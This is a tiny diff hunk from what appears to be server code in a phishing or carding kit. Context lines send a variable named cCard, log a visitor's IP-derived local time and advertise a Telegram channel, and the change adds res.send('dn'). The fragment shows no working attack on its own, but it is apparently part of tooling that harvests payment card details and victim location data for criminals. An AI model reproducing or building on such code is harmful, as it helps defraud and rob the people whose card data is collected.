@@ -114,6 +114,7 @@ res.send(cCard);
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`+
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
+res.send('dn');
   }
 
   
